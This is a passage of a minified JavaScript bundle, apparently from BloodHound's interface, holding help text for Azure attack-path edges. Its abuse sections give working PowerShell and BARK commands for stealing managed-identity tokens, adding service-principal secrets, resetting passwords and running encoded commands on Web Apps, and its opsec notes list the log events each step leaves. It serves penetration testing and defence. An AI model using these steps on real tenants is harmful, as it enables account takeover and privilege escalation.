Abuse"})]}),ia={general:ra,abuse:oa,opsec:aa,references:sa},ca=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),da=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),la=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),ha=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),pa={general:ca,abuse:da,opsec:la,references:ha},ua=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),ma=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),ba=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),ga=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes",children:"Assign Azure AD roles at different scopes"})]}),ya={general:ua,abuse:ma,opsec:ba,references:ga},fa=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),wa=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),xa=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),ja=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),va={general:fa,abuse:wa,opsec:xa,references:ja},Aa=()=>e.jsx(t,{variant:"body2",children:"Azure resources like Virtual Machines, Logic Apps, and Automation Accounts can be assigned to either System- or User-Assigned Managed Identities. This assignment allows the Azure resource to authenticate to Azure services as the Managed Identity without needing to know the credential for that Managed Identity. Managed Identities, whether System- or User-Assigned, are AzureAD Service Principals."}),Sa=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can modify the Azure RM resource to execute actions against Azure with the privileges of the Managed Identity Service Principal."}),e.jsx(t,{variant:"body2",children:"It is also possible to extract a JSON Web Token (JWT) for the Service Principal, then use that JWT to authenticate as the Service Principal outside the scope of the Azure RM resource. Here is how you extract the JWT using PowerShell:"}),e.jsx(t,{component:"pre",children:`$tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"
$tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI
$tokenResponse.access_token`}),e.jsx(t,{variant:"body2",children:"We can then use this JWT to authenticate as the Service Principal to the Microsoft Graph APIs using BARK for example."})]}),ka=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),Ta=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1078/",children:"https://attack.mitre.org/techniques/T1078/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a",children:"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://m365internals.com/2021/11/30/lateral-movement-with-managed-identities-of-azure-virtual-machines",children:"https://m365internals.com/2021/11/30/lateral-movement-with-managed-identities-of-azure-virtual-machines"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"https://github.com/BloodHoundAD/BARK"})]}),Pa={general:Aa,abuse:Sa,opsec:ka,references:Ta},k=(n,r)=>!n||!r?"This entity has":n==="Group"?`The members of the ${I(n)} ${r} have`:`The ${I(n)} ${r} has`,I=n=>n?n==="GPO"||n==="OU"?n:n.toLowerCase():"",Ca=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",I(r)," ",n," is a member of the group ",a,"."]}),e.jsx(t,{variant:"body2",children:"Groups in Azure Active Directory grant their direct members any privileges the group itself has. If a group has an AzureAD admin role, direct members of the group inherit those permissions."})]}),Da=()=>e.jsx(t,{variant:"body2",children:"No abuse is necessary. This edge simply indicates that a principal belongs to a security group."}),Ra=()=>e.jsx(t,{variant:"body2",children:"No opsec considerations apply to this edge."}),Oa=()=>e.jsx(h,{sx:{overflowX:"auto"},children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/groups-create-eligible",children:"Create a role-assignable group in Azure Active Directory"})}),$a={general:Ca,abuse:Da,opsec:Ra,references:Oa},Ia=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created to link Azure Kubernetes Service Managed Clusters to the Virtual Machine Scale Sets they use to execute commands on."}),e.jsx(t,{variant:"body2",children:"The system-assigned identity for the AKS Cluster will have the Contributor role against the target Resource Group and its child Virtual Machine Scale Sets."})]}),Ma=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"You will abuse this relationship by executing a command against the AKS Managed Cluster the edge is emiting from. You can target any managed identity assignment scoped to the Virtual Machine Scale Sets under the target Resource Group."})}),Ga=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),Ea=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/",children:"Karl Fosaaen - How To Extract Credentials from Azure Kubernetes Service (AKS)"})]}),Fa={general:Ia,abuse:Ma,opsec:Ga,references:Ea},Ua=()=>e.jsx(t,{variant:"body2",children:"Object ownership means almost all abuses are possible against the target object."}),_a=()=>e.jsx(t,{variant:"body2",children:"Everything a Contributor can do, with the addition of assigning rights to resources."}),La=()=>e.jsx(t,{variant:"body2",children:"This depends on which abuse you perform, but in general Azure will create a log for each abuse action."}),Wa=()=>e.jsx(h,{sx:{overflowX:"auto"},children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/attacking-azure-with-custom-script-extensions/",children:"https://blog.netspi.com/attacking-azure-with-custom-script-extensions/"})}),za={general:Ua,abuse:_a,opsec:La,references:Wa},Ba=()=>e.jsx(t,{variant:"body2",children:"This edge indicates the principal has the Privileged Authentication Administrator role active against the target tenant. Principals with this role can update sensitive properties for all users. Privileged Authentication Administrator can set or reset any authentication method (including passwords) for any user, including Global Administrators."}),Na=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Set secret for Service Principal (AZAddSecret abuse info)"}),e.jsx(t,{variant:"body2",children:"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."}),e.jsx(t,{variant:"body2",children:"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."}),e.jsxs(t,{variant:"body2",children:["These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",e.jsx(t,{component:"pre",children:'$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken "0.ARwA6WgJJ9X2qk…" -TenantID "contoso.onmicrosoft.com"'})]}),e.jsxs(t,{variant:"body2",children:["Then use BARK’s New-AppRegSecret to add a new secret to the target application:",e.jsx(t,{component:"pre",children:'New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token'})]}),e.jsxs(t,{variant:"body2",children:["The output will contain the plain-text secret you just created for the target app:",e.jsx(t,{component:"pre",children:'PS /Users/andyrobbins> New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31… AppRegObjectId d878…'})]}),e.jsxs(t,{variant:"body2",children:["With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:",e.jsx(t,{component:"pre",children:'PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `-ClientID "4d31…" `-ClientSecret "odg8Q~..." `-TenantName "contoso.onmicrosoft.com" PS /Users/andyrobbins> $SPToken.access_token eyJ0eXAiOiJKV1QiLCJub…'})]}),e.jsx(t,{variant:"body2",children:"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."}),e.jsx(t,{variant:"body1",children:"Reset password of user (AZResetPassword abuse info)"}),e.jsx(t,{variant:"body2",children:"There are several options for executing this attack. What will work best for you depends on a few factors, including which type of credential you possess for the principal with the password reset privilege against the target, whether that principal is affected by MFA requirements, and whether the principal is affected by conditional access policies."}),e.jsx(t,{variant:"body2",children:'The most simple way to execute this attack is to log into the Azure Portal at portal.azure.com as the principal with the password reset privilege, locate the target user in the Portal, and click "Reset Password" on the target user’s overview tab.'}),e.jsx(t,{variant:"body2",children:"You can also execute this attack with the official Microsoft PowerShell module, using Set-AzureADUserPassword, or PowerZure’s Set-AzureUserPassword cmdlet."}),e.jsx(t,{variant:"body2",children:"In some situations, you may only have access to your compromised principal’s JWT, and not its password or other credential material. For example, you may have stolen a JWT for a service principal from an Azure Logic App, or you may have stolen a user’s JWT from Chrome."}),e.jsx(t,{variant:"body2",children:"There are at least two ways to reset a user’s password when using a token, depending on the scope of the token and the type of identity associated with the token:"}),e.jsx(t,{variant:"body1",children:"Using an MS Graph-scoped token"}),e.jsx(t,{variant:"body2",children:"If your token is associated with a Service Principal or User, you may set the target’s password to a known value by hitting the MS Graph API."}),e.jsx(t,{variant:"body2",children:"You can use BARK’s Set-AZUserPassword cmdlet to do this. First, we need to either already have or create an MS Graph-scoped JWT for the user or service principal with the ability to reset the target user’s password:"}),e.jsx(t,{component:"pre",children:'$MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID "<service principal’s app id>" -ClientSecret "<service principal’s plain text secret>" -TenantName "contoso.onmicrosoft.com").access_token'}),e.jsx(t,{variant:"body2",children:"Then we supply this token, our target user’s ID, and the new password to the Set-AZUserPassword cmdlet:"}),e.jsx(t,{component:"pre",children:'Set-AZUserPassword -Token $MGToken -TargetUserID "d9644c..." -Password "SuperSafePassword12345"'}),e.jsxs(t,{variant:"body2",children:['If successful, the output will include a "204" status code:',e.jsx(t,{component:"pre",children:"StatusCode : 204 StatusDescription : NoContent Content : {} RawContent : HTTP/1.1 204 NoContent Cache-Control: no-cache Strict-Transport-Security: max-age=31536000 request-id: 94243... client-request-id: 94243... x-ms… Headers : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…} RawContentLength : 0 RelationLink : {}"})]}),e.jsx(t,{variant:"body1",children:"Using an Azure Portal-scoped token"}),e.jsx(t,{variant:"body2",children:"You may have or be able to acquire an Azure Portal-scoped JWT for the user with password reset rights against your target user. In this instance, you can reset the user’s password, letting Azure generate a new random password for the user instead of you supplying one. For this, you can use BARK’s Reset-AZUserPassword cmdlet."}),e.jsx(t,{variant:"body2",children:"You may already have the Azure Portal-scoped JWT, or you may acquire one through various means. For example, you can use a refresh token to acquire a Portal-scoped JWT by using BARK’s Get-AzurePortalTokenWithRefreshToken cmdlet:"}),e.jsx(t,{component:"pre",children:'$PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Now you can supply the Portal token to BARK’s Reset-AZUserPassword cmdlet:"}),e.jsx(t,{component:"pre",children:'Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID "targetuser@contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"If successful, the response will look like this:"}),e.jsx(t,{component:"pre",children:'StatusCode : 200 StatusDescription : OK Content : "Gafu1918" RawContent : HTTP/1.1 200 OK Cache-Control: no-store Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None X-Content-Type-Options: no… Headers : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 10 RelationLink : {}'}),e.jsx(t,{variant:"body2",children:'As you can see, the plain-text value of the user’s password is visible in the "Content" parameter value.'})]}),Va=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When you create a new secret for an App or Service Principal, Azure creates an event called “Update application – Certificates and secrets management”. This event describes who added the secret to which application or service principal."}),e.jsx(t,{variant:"body2",children:"When resetting a user’s password and letting Azure set a new random password, Azure will log two events:"}),e.jsx(t,{variant:"body2",children:"“Reset user password” and “Reset password (by admin)”. These logs describe who performed the password reset, against which user, and at what time."}),e.jsx(t,{variant:"body2",children:"When setting a specified new password for the user, Azure will log two events:"}),e.jsx(t,{variant:"body2",children:"“Reset user password” and “Update user”. The first log will describe who changed the target’s password and when."})]}),Ka=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword",children:"PowerZure Set-AzureUserPassword"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#privileged-authentication-administrator",children:"Microsoft Azure AD roles"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes",children:"Assign Azure AD roles at different scopes"})]}),Ha={general:Ba,abuse:Na,opsec:Va,references:Ka},qa=()=>e.jsx(t,{variant:"body2",children:"The Privileged Role Admin role can grant any other admin role to another principal at the tenant level."}),Ya=()=>e.jsx(t,{variant:"body2",children:"Activate the Global Admin role for yourself or for another user using PowerZure or PowerShell."}),Ja=()=>e.jsx(t,{variant:"body2",children:"The Azure Activity Log will log who activated an admin role for what other principal, including the date and time."}),Xa=()=>e.jsx(h,{sx:{overflowX:"auto"},children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadrole",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadrole"})}),Qa={general:qa,abuse:Ya,opsec:Ja,references:Xa},Za=()=>e.jsx(t,{variant:"body2",children:"The ability to change another user's password without knowing their current password"}),es=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several options for executing this attack. What will work best for you depends on a few factors, including which type of credential you possess for the principal with the password reset privilege against the target, whether that principal is affected by MFA requirements, and whether the principal is affected by conditional access policies."}),e.jsx(t,{variant:"body2",children:'The most simple way to execute this attack is to log into the Azure Portal at portal.azure.com as the principal with the password reset privilege, locate the target user in the Portal, and click "Reset Password" on the target user’s overview tab.'}),e.jsx(t,{variant:"body2",children:"You can also execute this attack with the official Microsoft PowerShell module, using Set-AzureADUserPassword, or PowerZure’s Set-AzureUserPassword cmdlet."}),e.jsx(t,{variant:"body2",children:"In some situations, you may only have access to your compromised principal’s JWT, and not its password or other credential material. For example, you may have stolen a JWT for a service principal from an Azure Logic App, or you may have stolen a user’s JWT from Chrome."}),e.jsx(t,{variant:"body2",children:"There are at least two ways to reset a user’s password when using a token, depending on the scope of the token and the type of identity associated with the token:"}),e.jsx(t,{variant:"body1",children:"Using an MS Graph-scoped token"}),e.jsx(t,{variant:"body2",children:"If your token is associated with a Service Principal or User, you may set the target’s password to a known value by hitting the MS Graph API."}),e.jsx(t,{variant:"body2",children:"You can use BARK’s Set-AZUserPassword cmdlet to do this. First, we need to either already have or create an MS Graph-scoped JWT for the user or service principal with the ability to reset the target user’s password:"}),e.jsx(t,{component:"pre",children:'$MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID "<service principal’s app id>" -ClientSecret "<service principal’s plain text secret>" -TenantName "contoso.onmicrosoft.com").access_token'}),e.jsx(t,{variant:"body2",children:"Then we supply this token, our target user’s ID, and the new password to the Set-AZUserPassword cmdlet:"}),e.jsx(t,{component:"pre",children:'Set-AZUserPassword -Token $MGToken -TargetUserID "d9644c..." -Password "SuperSafePassword12345"'}),e.jsxs(t,{variant:"body2",children:['If successful, the output will include a "204" status code:',e.jsx(t,{component:"pre",children:"StatusCode : 204 StatusDescription : NoContent Content : {} RawContent : HTTP/1.1 204 NoContent Cache-Control: no-cache Strict-Transport-Security: max-age=31536000 request-id: 94243... client-request-id: 94243... x-ms… Headers : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…} RawContentLength : 0 RelationLink : {}"})]}),e.jsx(t,{variant:"body1",children:"Using an Azure Portal-scoped token"}),e.jsx(t,{variant:"body2",children:"You may have or be able to acquire an Azure Portal-scoped JWT for the user with password reset rights against your target user. In this instance, you can reset the user’s password, letting Azure generate a new random password for the user instead of you supplying one. For this, you can use BARK’s Reset-AZUserPassword cmdlet."}),e.jsx(t,{variant:"body2",children:"You may already have the Azure Portal-scoped JWT, or you may acquire one through various means. For example, you can use a refresh token to acquire a Portal-scoped JWT by using BARK’s Get-AzurePortalTokenWithRefreshToken cmdlet:"}),e.jsx(t,{component:"pre",children:'$PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Now you can supply the Portal token to BARK’s Reset-AZUserPassword cmdlet:"}),e.jsx(t,{component:"pre",children:'Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID "targetuser@contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"If successful, the response will look like this:"}),e.jsx(t,{component:"pre",children:'StatusCode : 200 StatusDescription : OK Content : "Gafu1918" RawContent : HTTP/1.1 200 OK Cache-Control: no-store Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None X-Content-Type-Options: no… Headers : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 10 RelationLink : {}'}),e.jsx(t,{variant:"body2",children:'As you can see, the plain-text value of the user’s password is visible in the "Content" parameter value.'})]}),ts=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When resetting a user’s password and letting Azure set a new random password, Azure will log two events:"}),e.jsx(t,{variant:"body2",children:"“Reset user password” and “Reset password (by admin)”. These logs describe who performed the password reset, against which user, and at what time."}),e.jsx(t,{variant:"body2",children:"When setting a specified new password for the user, Azure will log two events:"}),e.jsx(t,{variant:"body2",children:"“Reset user password” and “Update user”. The first log will describe who changed the target’s password and when."})]}),ns=()=>e.jsx(t,{variant:"body2",children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword"})}),rs={general:Za,abuse:es,opsec:ts,references:ns},os=()=>e.jsx(t,{variant:"body2",children:"The Azure App runs as the Service Principal when it needs to authenticate to the tenant"}),as=()=>e.jsx(t,{variant:"body2",children:"This edge should be taken into consideration when abusing control of an app. Apps authenticate with service principals to the tenant, so if you have control of an app, what you are abusing is that control plus the fact that the app runs as a privileged service principal"}),ss=()=>e.jsx(t,{variant:"body2",children:"No opsec considerations for this edge."}),is=()=>e.jsx(h,{sx:{overflowX:"auto"},children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.google.com",children:"References go here"})}),cs={general:os,abuse:as,opsec:ss,references:is},ds=()=>e.jsx(t,{variant:"body2",children:"The User Access Admin role can edit roles against many other objects"}),ls=()=>e.jsx(t,{variant:"body2",children:"This role can be used to grant yourself or another principal any privilege you want against Automation Accounts, VMs, Key Vaults, and Resource Groups. Use the Azure portal to add a new, abusable role assignment against the target object for yourself."}),hs=()=>e.jsx(t,{variant:"body2",children:"Azure will log any role activation event for any object type."}),ps=()=>e.jsx(h,{sx:{overflowX:"auto"},children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/",children:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/"})}),us={general:ds,abuse:ls,opsec:hs,references:ps},ms=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'When a virtual machine is configured to allow logon with Azure AD credentials, the VM automatically has certain principals added to its local administrators group, including any principal granted the Virtual Machine Administrator Login (or "VMAL") admin role.'}),e.jsx(t,{variant:"body2",children:"Any principal granted this role, scoped to the affected VM, can connect to the VM via RDP and will be granted local admin rights on the VM."})]}),bs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"Connect to the VM via RDP and you will be granted local admin rights on the VM."})}),gs=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"If the target computer is a workstation and a user is currently logged on, one of two things will happen. If the user you are abusing is the same user as the one logged on, you will effectively take over their session and kick the logged on user off, resulting in a message to the user. If the users are different, you will be prompted to kick the currently logged on user off the system and log on. If the target computer is a server, you will be able to initiate the connection without issue provided the user you are abusing is not currently logged in."}),e.jsx(t,{variant:"body2",children:"Remote desktop will create Logon and Logoff events with the access type RemoteInteractive."})]}),ys=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/tactics/TA0008/",children:"ATT&CK T0008: Lateral Movement"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1021/",children:"ATT&CK T1021: Remote Services"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/active-directory/devices/howto-vm-sign-in-azure-ad-windows",children:"Login to Windows virtual machine in Azure using Azure Active Directory authentication"})]}),fs={general:ms,abuse:bs,opsec:gs,references:ys},ws=()=>e.jsx(t,{variant:"body2",children:"The Virtual Machine contributor role grants almost all abusable privileges against Virtual Machines."}),xs=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The Virtual Machine Contributor role allows you to run SYSTEM commands on the VM"}),e.jsx(t,{variant:"body2",children:"Via PowerZure:"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunCommand",children:"Invoke-AzureRunCommand"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunMSBuild",children:"Invoke-AzureRunMSBuild"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram",children:"Invoke-AzureRunProgram"})]}),js=()=>e.jsx(t,{variant:"body2",children:"Because you'll be running a command as the SYSTEM user on the Virtual Machine, the same opsec considerations for running malicious commands on any system should be taken into account: command line logging, PowerShell script block logging, EDR, etc."}),vs=()=>e.jsx(h,{sx:{overflowX:"auto"},children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/running-powershell-scripts-on-azure-vms/",children:"https://blog.netspi.com/running-powershell-scripts-on-azure-vms/"})}),As={general:ws,abuse:xs,opsec:js,references:vs},Ss=()=>e.jsx(t,{variant:"body2",children:"The Website Contributor role grants full control of the target Function App or Web App. Full control of either of those types of resources allows for arbitrary command execution against the target resoruce."}),ks=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can use BARK's Invoke-AzureRMWebAppShellCommand function to execute commands on a target Web App. You can use BARK's New-PowerShellFunctionAppFunction, Get-AzureFunctionAppMasterKeys, and Get-AzureFunctionOutput functions to execute arbitrary commands against a target Function App."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the web app or function app. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"}),e.jsx(t,{component:"pre",children:'$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n    -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:`Now you can use BARK's Invoke-AzureRMWebAppShellCommand function to execute a command against the target Web App. For example, to run a simple "whoami" command:`}),e.jsx(t,{component:"pre",children:'Invoke-AzureRMWebAppShellCommand `\n    -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `\n    -Token $ARMToken `\n    -Command "whoami"'}),e.jsx(t,{variant:"body2",children:"If the Web App has a managed identity assignments, you can use BARK's Invoke-AzureRMWebAppShellCommand function to retrieve a JWT for the managed identity Service Principal like this:"}),e.jsx(t,{component:"pre",children:`PS C:> $PowerShellCommand = 
            $headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}
            $response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers $headers
            $response.RawContent

PS C:> $base64Cmd = [System.Convert]::ToBase64String(
            [System.Text.Encoding]::Unicode.GetBytes(
                $PowerShellCommand
            )
        )

PS C:> $Command = "powershell -enc $($base64Cmd)"

PS C:> Invoke-AzureRMWebAppShellCommand \`
            -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" \`
            -token $ARMToken \`
            -Command $Command`}),e.jsx(t,{variant:"body2",children:"If successful, the output will include a JWT for the managed identity service principal."})]}),Ts=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),Ps=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.netspi.com/blog/technical/cloud-penetration-testing/lateral-movement-azure-app-services/",children:"Karl Fosaaen - Lateral Movement in Azure App Services"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95",children:"Andy Robbins - Abusing Azure App Service Managed Identity Assignments"})]}),Cs={general:Ss,abuse:ks,opsec:Ts,references:Ps},Ds=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," can modify the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer ",a,"."]}),e.jsx(t,{variant:"body2",children:"The ability to modify the 